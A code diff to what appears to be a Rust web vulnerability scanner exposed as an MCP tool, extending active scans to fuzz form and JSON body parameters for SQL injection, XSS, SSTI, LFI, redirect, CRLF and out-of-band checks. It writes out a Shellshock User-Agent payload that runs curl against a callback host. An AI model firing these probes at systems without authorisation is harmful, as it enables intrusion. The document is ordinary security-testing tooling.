@@ -1,9 +1,17 @@
+use super::source::ResolvedSource;
 use super::{next_finding_id, Finding};
 use crate::mcp::types::HandlerResult;
 use std::collections::HashMap;
 
 pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
-    let target = params["target"].as_str().ok_or("target URL is required")?;
+    // v0.3.8: scan an intercepted request OR a traffic-log entry OR an explicit
+    // target. When a source is given we inherit method + headers + body and
+    // also fuzz body parameters (JSON object keys + form-urlencoded fields) in
+    // addition to query parameters — that's the bug the user hit: form-encoded
+    // login bodies were never being attacked.
+    let source = super::source::resolve(params).await?;
+    let target = source.url.clone();
+    let target = target.as_str();
 
     let scan_types: Vec<String> = params["scan_types"]
         .as_array()
@@ -24,12 +32,15 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
         .build()
         .map_err(|e| format!("Client error: {}", e))?;
 
-    let parsed = url::Url::parse(target).map_err(|e| format!("Invalid URL: {}", e))?;
+    // Build the unified injection-point list: query parameters + body
+    // parameters (form-urlencoded + top-level JSON object keys).
+    let injection_points = collect_injection_points(&source);
+    // Backward-compat alias for the existing loops below.
     let params_list: Vec<(String, String)> =
-        parsed.query_pairs().map(|(k, v)| (k.to_string(), v.to_string())).collect();
+        injection_points.iter().map(|p| (p.name.clone(), p.original_value.clone())).collect();
 
     let start = std::time::Instant::now();
-    let baseline = match client.get(target).send().await {
+    let baseline = match source.builder(&client, target).send().await {
         Ok(resp) => {
             let status = resp.status().as_u16();
             let body = resp.text().await.unwrap_or_default();
@@ -46,12 +57,12 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
         let mut stats = ScanTypeStats::default();
         let payloads = load_payloads("sqli", max_payloads);
 
-        for (param_name, param_value) in &params_list {
+        for (param_name, _param_value) in &params_list {
             for payload in &payloads {
                 stats.requests += 1;
-                let test_url = replace_param(target, param_name, payload);
+                let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
 
-                if let Ok(resp) = client.get(&test_url).send().await {
+                if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                     let body = resp.text().await.unwrap_or_default();
 
                     for (pattern, db_type) in SQL_ERROR_PATTERNS {
@@ -84,16 +95,19 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
             ];
             for (payload, expected_delay) in &time_payloads {
                 stats.requests += 1;
-                let test_url = replace_param(target, param_name, payload);
+                let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
                 let t_start = std::time::Instant::now();
-                if let Ok(resp) = client.get(&test_url).send().await {
+                if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                     let elapsed = t_start.elapsed().as_millis() as u64;
                     let _ = resp.text().await;
                     if elapsed >= *expected_delay && elapsed < (*expected_delay + 5000) {
                         let verify_payload = payload.replace('3', "0");
-                        let verify_url = replace_param(target, param_name, &verify_payload);
+                        let (verify_url, verify_body) =
+                            mutate(&source, &injection_points, param_name, &verify_payload);
                         let v_start = std::time::Instant::now();
-                        if let Ok(v_resp) = client.get(&verify_url).send().await {
+                        if let Ok(v_resp) =
+                            dispatch_req(&source, &client, &verify_url, &verify_body).send().await
+                        {
                             let v_elapsed = v_start.elapsed().as_millis() as u64;
                             let _ = v_resp.text().await;
                             if v_elapsed < 2000 && elapsed > v_elapsed + 2000 {
@@ -128,8 +142,8 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
 
         for (param_name, _) in &params_list {
             stats.requests += 1;
-            let test_url = replace_param(target, param_name, &canary);
-            if let Ok(resp) = client.get(&test_url).send().await {
+            let (test_url, test_body) = mutate(&source, &injection_points, param_name, &canary);
+            if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                 let body = resp.text().await.unwrap_or_default();
                 if body.contains(&canary) {
                     let xss_payloads = load_payloads("xss", max_payloads.min(15));
@@ -147,8 +161,8 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
 
                     for payload in &all_xss {
                         stats.requests += 1;
-                        let test_url = replace_param(target, param_name, payload);
-                        if let Ok(resp) = client.get(&test_url).send().await {
+                        let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
+                        if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                             let resp_body = resp.text().await.unwrap_or_default();
 
                             if resp_body.contains(payload) {
@@ -211,8 +225,8 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
         for (param_name, _) in &params_list {
             for (payload, expected, engine) in &ssti_probes {
                 stats.requests += 1;
-                let test_url = replace_param(target, param_name, payload);
-                if let Ok(resp) = client.get(&test_url).send().await {
+                let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
+                if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                     let body = resp.text().await.unwrap_or_default();
                     if body.contains(expected) && !baseline.body.contains(expected) {
                         stats.findings += 1;
@@ -253,8 +267,8 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
         for (param_name, _) in &params_list {
             for (payload, indicator, technique) in &lfi_payloads {
                 stats.requests += 1;
-                let test_url = replace_param(target, param_name, payload);
-                if let Ok(resp) = client.get(&test_url).send().await {
+                let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
+                if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                     let body = resp.text().await.unwrap_or_default();
                     if body.contains(indicator) && !baseline.body.contains(indicator) {
                         stats.findings += 1;
@@ -311,8 +325,8 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
             if redirect_params.iter().any(|rp| param_name.to_lowercase().contains(rp)) {
                 for payload in &redirect_payloads {
                     stats.requests += 1;
-                    let test_url = replace_param(target, param_name, payload);
-                    if let Ok(resp) = client.get(&test_url).send().await {
+                    let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
+                    if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                         let status = resp.status().as_u16();
                         if (300..400).contains(&status) {
                             if let Some(loc) = resp.headers().get("location") {
@@ -356,8 +370,8 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
         for (param_name, _) in &params_list {
             for payload in &crlf_payloads {
                 stats.requests += 1;
-                let test_url = replace_param(target, param_name, payload);
-                if let Ok(resp) = client.get(&test_url).send().await {
+                let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
+                if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                     let has_injected = resp.headers().contains_key("x-injected");
                     let _ = resp.text().await;
                     if has_injected {
@@ -442,18 +456,22 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
                             .insert(p.correlation_id.clone(), (param_name.clone(), (*kind).to_string()));
                         for injection in mk_payloads(&p.callback_url, &server_domain) {
                             stats.requests += 1;
-                            let url = replace_param(target, param_name, &injection);
-                            let _ = client.get(&url).send().await;
+                            let (url, body) = mutate(&source, &injection_points, param_name, &injection);
+                            let _ = dispatch_req(&source, &client, &url, &body).send().await;
                         }
                     }
                 }
 
-                // Shellshock probe (User-Agent header carrier).
+                // Shellshock probe (User-Agent header carrier). Replay the
+                // source request shape but with an attacker User-Agent.
                 let shellshock_p = crate::oast::generate_oast_payload("shellshock probe", &server_domain);
                 payload_map
                     .insert(shellshock_p.correlation_id.clone(), ("User-Agent".into(), "shellshock".into()));
                 let ua = format!("() {{ :; }}; /usr/bin/curl {}", shellshock_p.callback_url);
-                let _ = client.get(target).header("User-Agent", ua).send().await;
+                let _ = dispatch_req(&source, &client, target, &source.body)
+                    .header("User-Agent", ua)
+                    .send()
+                    .await;
                 stats.requests += 1;
 
                 let wait_ms = params["oast_wait_ms"].as_u64().unwrap_or(15000);
@@ -515,6 +533,9 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
         *severity_counts.entry(f.severity.clone()).or_insert(0) += 1;
     }
 
+    let body_points = injection_points.iter().filter(|p| p.location != InjLoc::Query).count();
+    let query_points = injection_points.iter().filter(|p| p.location == InjLoc::Query).count();
+
     Ok(serde_json::json!({
         "target": target,
         "baseline": {
@@ -522,7 +543,17 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
             "body_length": baseline.body_len,
             "response_time_ms": baseline.time_ms,
         },
-        "injection_points": params_list.len(),
+        "injection_points": injection_points.len(),
+        "injection_points_breakdown": {
+            "query": query_points,
+            "body": body_points,
+        },
+        "source": {
+            "origin": source.origin,
+            "method": source.method,
+            "had_body": !source.body.is_empty(),
+            "header_count": source.headers.len(),
+        },
         "scan_types": scan_stats.keys().collect::<Vec<_>>(),
         "total_requests": total_requests,
         "total_findings": total_findings,
@@ -573,7 +604,127 @@ const SQL_ERROR_PATTERNS: &[(&str, &str)] = &[
     ("HY000", "Generic SQL"),
 ];
 
-fn replace_param(url: &str, param_name: &str, new_value: &str) -> String {
+/// v0.3.8: an injection point is either a query-string parameter, a form-
+/// encoded body field, or a top-level JSON-object key. The active scanner
+/// fuzzes ALL three locations now — previously body params were unreachable.
+#[derive(Debug, Clone)]
+pub(super) struct InjectionPoint {
+    pub name: String,
+    pub original_value: String,
+    pub location: InjLoc,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(super) enum InjLoc {
+    Query,
+    BodyForm,
+    BodyJson,
+}
+
+/// Build the unified injection-point list from a ResolvedSource. Order:
+/// query params first (existing behavior), then body params. Body params are
+/// only included if the source has a body and the content-type indicates a
+/// parameterized payload (form / json).
+pub(super) fn collect_injection_points(source: &ResolvedSource) -> Vec<InjectionPoint> {
+    let mut points = Vec::new();
+    if let Ok(parsed) = url::Url::parse(&source.url) {
+        for (k, v) in parsed.query_pairs() {
+            points.push(InjectionPoint {
+                name: k.into_owned(),
+                original_value: v.into_owned(),
+                location: InjLoc::Query,
+            });
+        }
+    }
+    if !source.body.is_empty() {
+        let ctype = source
+            .headers
+            .iter()
+            .find(|(k, _)| k.eq_ignore_ascii_case("content-type"))
+            .map(|(_, v)| v.to_ascii_lowercase())
+            .unwrap_or_default();
+        let looks_json = ctype.contains("json")
+            || source.body.trim_start().starts_with('{')
+            || source.body.trim_start().starts_with('[');
+        let looks_form = ctype.contains("x-www-form-urlencoded")
+            || (!looks_json && source.body.contains('=') && !source.body.contains('\n'));
+        if looks_json {
+            if let Ok(v) = serde_json::from_str::<serde_json::Value>(&source.body) {
+                if let Some(obj) = v.as_object() {
+                    for (k, val) in obj {
+                        points.push(InjectionPoint {
+                            name: k.clone(),
+                            original_value: match val {
+                                serde_json::Value::String(s) => s.clone(),
+                                _ => val.to_string(),
+                            },
+                            location: InjLoc::BodyJson,
+                        });
+                    }
+                }
+            }
+        }
+        if looks_form {
+            for (k, v) in super::source::parse_form_body(&source.body) {
+                points.push(InjectionPoint { name: k, original_value: v, location: InjLoc::BodyForm });
+            }
+        }
+    }
+    points
+}
+
+/// Mutate URL and body for a payload at the given parameter — returns
+/// (test_url, test_body). For query points the URL is mutated and the body is
+/// untouched; for body points the URL stays the same and the body is rewritten
+/// in place. Falls back to URL replace if the parameter isn't in the
+/// injection-point list (preserves old behavior on unknown names).
+pub(super) fn mutate(
+    source: &ResolvedSource,
+    points: &[InjectionPoint],
+    param_name: &str,
+    payload: &str,
+) -> (String, String) {
+    let point = points.iter().find(|p| p.name == param_name);
+    match point.map(|p| p.location) {
+        Some(InjLoc::BodyForm) => {
+            (source.url.clone(), super::source::replace_form_param(&source.body, param_name, payload))
+        }
+        Some(InjLoc::BodyJson) => {
+            (source.url.clone(), super::source::replace_json_param(&source.body, param_name, payload))
+        }
+        Some(InjLoc::Query) | None => {
+            (replace_query_param(&source.url, param_name, payload), source.body.clone())
+        }
+    }
+}
+
+/// Build a RequestBuilder for an attack probe. Preserves method + headers +
+/// (mutated) body from the source so the probe replays cookies, auth,
+/// content-type etc. exactly.
+pub(super) fn dispatch_req(
+    source: &ResolvedSource,
+    client: &reqwest::Client,
+    test_url: &str,
+    test_body: &str,
+) -> reqwest::RequestBuilder {
+    let method = reqwest::Method::from_bytes(source.method.as_bytes()).unwrap_or(reqwest::Method::GET);
+    let mut req = client.request(method, test_url);
+    const STRIP: &[&str] = &["host", "content-length", "connection", "transfer-encoding", "accept-encoding"];
+    for (k, v) in &source.headers {
+        if STRIP.iter().any(|s| k.eq_ignore_ascii_case(s)) {
+            continue;
+        }
+        req = req.header(k.as_str(), v.as_str());
+    }
+    if !test_body.is_empty() {
+        req = req.body(test_body.to_string());
+    }
+    req
+}
+
+/// URL-only query-string mutation (renamed from `replace_param` — kept for the
+/// open-redirect / OAST scan-types that target query strings specifically).
+pub(super) fn replace_query_param(url: &str, param_name: &str, new_value: &str) -> String {
     if let Ok(mut parsed) = url::Url::parse(url) {
         let pairs: Vec<(String, String)> = parsed
             .query_pairs()
